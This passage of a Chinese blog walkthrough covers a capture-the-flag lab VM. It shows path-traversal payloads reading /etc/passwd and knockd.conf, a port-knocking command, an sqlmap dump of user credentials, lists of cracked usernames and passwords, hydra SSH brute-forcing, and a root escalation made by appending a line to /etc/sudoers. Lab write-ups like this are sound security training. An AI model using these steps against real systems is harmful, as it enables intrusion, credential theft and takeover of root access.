+<p>就多了个Add Record界面，注意到下面有File does not exist，想到是程序引用或读取了一个不存在的文件才会回显这个，接着用参数fuzz测试一下</p>
+<p>burpsuite抓包，构建payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?§§=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Njk3MmVlMzI4ZTdiNjI4NDJjYzRjNGIwNjViYjk3OGJfblVqNkFmUHJXVFVmcjJJdVJsa2FsT0R0VXA3UXhzSHZfVG9rZW46V1V2N2JuN1VDb1F1V2N4S3lYN2NGTEVibjdiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>然后再把我们的参数字典加载进来</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE3ODVhMzNmZjgzYjVkMzZmZjI5MWEyNTJjYjY5MzdfcUcxdlpKUEFoQlA4ZUxncFRLV3JIMHdqR0RseDEwSGZfVG9rZW46VTluTGJsVk5Cb1kwZ3Z4MTAwNWM5MjJVbkNkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU4NTM3MTE0MTE3NDY3ZDg3YTUzMGE0M2QwYTg4ZjhfazZkQUxkNkhlM1JwUVJvS1doMHg2ZTJzZ1VkUlRoOFRfVG9rZW46TTkzMmJaSjJKb3JJZU54U3hJdGNZa2ZFbnpjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>参数名是file，存在任意文件读取漏洞</p>
+<h2 id="端口敲门服务"><a href="#端口敲门服务" class="headerlink" title="端口敲门服务"></a>端口敲门服务</h2><p>考虑到ssh端口是关闭的，可能是开启了knock服务（参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html">端口敲门服务</a>），利用文件包含确认一下，一般开启了knock服务就会存在&#x2F;etc&#x2F;knockd.conf文件</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/addrecord.php?file=../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQ4NjUwNzg2OTdhZTEwNWVlMDY5NDhhNWNhYmUxOGFfTGhEZ0ZSZWQwZ3c4SHhqckJGb2xIYkhHYkU3ZHl0S1hfVG9rZW46Sk50VGJueWtEb0Z0R1Z4QmV4NWNzRzJJbnNmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>果然有，开启ssh服务得依次敲击7469,8475,9842端口，利用netcat进行敲击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -z 192.168.217.137 7469 8475 9842</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ3NjkzMGY0NzM4MGE4YWY1NDZmZjFiYWEzZGQzYTFfUWtmYkJvQW56ZTYxNlMxdVk1QXFSeUhUZGtmOGhpZGZfVG9rZW46WktlWmJJSWI3bzhQQ1N4TW5IdmNmSFdSbnVRXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>敲击完后发现端口打开了</p>
+<h2 id="shh爆破"><a href="#shh爆破" class="headerlink" title="shh爆破"></a>shh爆破</h2><p>无奈测试了一下admin登不上去，想起之前SQLmap跑出过一个users的数据库</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM5MTNmOTY0ZWRiMGNkYTYyMWEzODI1MzAzYjJlMzZfdEpHTTl1NDJnSHg2N2pOa2FHa2s5STlNdHFYZDFQcjdfVG9rZW46VGlmcmJ1emszbzM2R0x4YzZXOWNpdmFPbkVoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>存放网站用户信息的，我们去瞧一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;users&#x27; -dump</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg5N2ZmNTAwZjYxYTJkOGQ4MTNlMjI3MjAzOTE0YTNfSG5jTGxuaWhubGV2N2V5S3BnUWFWb3JQSUY1b0xwS0VfVG9rZW46QzY0b2JyaURxb3FMTGl4bkRKdGN4amdqbkxmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>用这些账号密码组成字典，爆破ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ``username.txt</span><br></pre></td></tr></table></figure>
+
+<p>marym</p>
+<p>julied</p>
+<p>fredf</p>
+<p>barneyr</p>
+<p>tomc</p>
+<p>jerrym</p>
+<p>wilmaf</p>
+<p>bettyr</p>
+<p>chandlerb</p>
+<p>joeyt</p>
+<p>rachelg</p>
+<p>rossg</p>
+<p>monicag</p>
+<p>phoebeb</p>
+<p>scoots</p>
+<p>janitor</p>
+<p>janitor2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ``password.txt</span><br></pre></td></tr></table></figure>
+
+<p>3kfs86sfd</p>
+<p>468sfdfsd2</p>
+<p>4sfd87sfd1</p>
+<p>RocksOff</p>
+<p>TC&amp;TheBoyz</p>
+<p>B8m#48sd</p>
+<p>Pebbles</p>
+<p>BamBam01</p>
+<p>UrAG0D!</p>
+<p>Passw0rd</p>
+<p>yN72#dsd</p>
+<p>ILoveRachel</p>
+<p>3248dsds7s</p>
+<p>smellycats</p>
+<p>YR3BVxxxw87</p>
+<p>Ilovepeepee</p>
+<p>Hawaii-Five-0</p>
+<p>接下来用九头蛇进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk0NTBmZGExY2E4MGFjZGIwZjdiOTMyMjZmYjVmNDNfb2k5WXltRFlKUFBXSFM3T1YyV1I4ZHpTNGZOVUxWY2tfVG9rZW46UWo0N2JRa1Yxb2JUQXZ4anRBYWN0b2RNbjdmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>爆破出了三个用户</p>
+<p>chandlerb:UrAG0D!</p>
+<p>joeyt:Passw0rd</p>
+<p>janitor:Ilovepeepee</p>
+<p>尝试登入发现janitor用户有东西</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd .s*</span><br><span class="line">cat *</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MmExOGQxNTM5MGU3ODNiZjVkN2NmNWI3MDE0OGY4YWNfazRlSk5Od2kzOUVCS2w1ZjJDZmdYM1VNOGdrdW9PeUtfVG9rZW46TjR3VWJLN0Jpb1hXbG94ZlNUZWNzaEFSbmJWXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>有几个密码，复制到刚才的password文件继续爆破ssh</p>
+<p>vi password.txt</p>
+<p>BamBam01</p>
+<p>Passw0rd</p>
+<p>smellycats</p>
+<p>P0Lic#10-4</p>
+<p>B4-Tru3-001</p>
+<p>4uGU5T-NiGHts</p>
+<p>继续爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJmMjMxYTQ2M2U0ZTM4MjNmMTFmNTg5MzY3N2FjNjlfcUF1akZyaEc3bEJGVlg0TThMQzRad3Jtem82UmJjM2JfVG9rZW46V1l0VGJLRHh3b3BxUll4YmhsUmNiWW9NbnNlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>爆破出了一个新用户</p>
+<p>fredf     B4-Tru3-001</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJlYzY5MWVlZDdkMGZkZmZhZTk5YjY2MTNhNjE1ZGFfVUZybjhkMkpPNkNEMTAzb1A4V0V4YkV0QXpBcXBvMHpfVG9rZW46TUJQTGJrZzI5b2hGREV4Vlkwd2NCSTN4bm1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjU3NTVlYjhhMTE2Y2E5ODQxNTFhMDFkYTUzNWZmODZfTEh4YVhoR0d4eTM5R3lvODNQbTlkcU9TNjlEbHljSVJfVG9rZW46RkpwbWJ0VjdRb2M5SFJ4cmk5YmNra3VsbnlmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>发现有个root权限文件</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE0NWQ1NzU2MDNjYjAzMTlmODIwMjExMjc1MDc1OGZfcXhnMnN4clQxOG56aFBrMGFqUHpFUmlXRld0ckJMMjBfVG9rZW46SUNYVWJFMDZ1b3hlUFZ4WlBCMGNSREo3bk1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>打开test文件发现是一堆乱码，应该是一个程序</p>
+<p>type name 可以查看文件类型，看是否是二进制还是文本文件</p>
+<p>结果：啥也没看出来</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjY3Y2FkZjM5ZDEzNWU3ZDc3MmQ1N2U0ZTFjYWYwMDlfVk1mZXNLSWtGZ0t3M1JiWlF0V3JlWHQ3RlNMRHNpUTlfVG9rZW46VlN1QmJaN3FMb3VuTE14VXg5MWNBUnFtblZjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>在上两级目录发现test.py文件还有test.spec文件，所以后面目录下的test程序应该就是根据test.py文件写的，打开文件看一下test程序是干嘛的</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY3NmY0YzMxNDMzYmMyMzM0MzcwMTI2ODJjODJhZjBfMnlQaTY4S010VmlKSUhmamdCSXNhQ2FPcVZhM1h0UGlfVG9rZW46S1hHU2I4VXFlb1Bza3l4V09HRmNGbmcwblA4XzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>该脚本的意思是打开用户输入的第二个文件，将第二个文件的内容追加保存到第三个文件里面，也就是说如果有命令是test.py a.txt b.txt，就会将a.txt的文件内容保存到b.txt里面</p>
+<p>利用&#x2F;etc&#x2F;sudoers     <a target="_blank" rel="noopener" href="https://blog.csdn.net/Field_Yang/article/details/51547804">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法-CSDN博客</a></p>
+<p>将fredf  ALL&#x3D;(ALL:ALL) ALL写成一个文件a.ttx   将这个文件追加到&#x2F;etc&#x2F;sudoers</p>
+<p>先将目录切换到有权限的&#x2F;home&#x2F;fredf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/fredf</span><br></pre></td></tr></table></figure>
+
+<p>然后进行文件的创建的编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi a.ttx`    有人说在这里vi是个微型的，简单来说有坑，所以也可以用`nano a.ttx</span><br></pre></td></tr></table></figure>
+
+<p>写完就可进行&#x2F;home&#x2F;fredf的写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test a.ttx /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p>不显示就说明成功了</p>
+<p>之后进行用户切换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su - </span><br></pre></td></tr></table></figure>
+
+<p>sudo 就是尝试实行root权限  su就是提权  - 切换到环境变量里</p>
+<p>然后输入用户fredf的密码就可以了     密码：B4-Tru3-001</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=M2NiOTg5OGY4MGQxZmRiNzQ2NjFmOGYyYWE4NDY0MmNfVjExVnd3REkzNjRMS0RhYU41RXdTRzBXM0l5cG5sOWdfVG9rZW46Vk53ZWJzVDhkbzh5OTR4WHN6emNRV001bjZlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>之后就是寻找flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat theflag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA3YTlhZjdiZmYwOTBmNzg5MTUzMjhlZTg2YzNiYWZfdENoZGVkcVMydWs2OVZjQTVXZ2o0S2trT2hwNWxKQjBfVG9rZW46SEF3VWJCREgyb0hCUTJ4bEp2bWNsVElLbmxiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+</article>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">John Doe</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0">Stellar 1.27.0</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+</aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `Just`,
+      min: `minutes ago`,
+      hour: `hours ago`,
+      day: `days ago`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
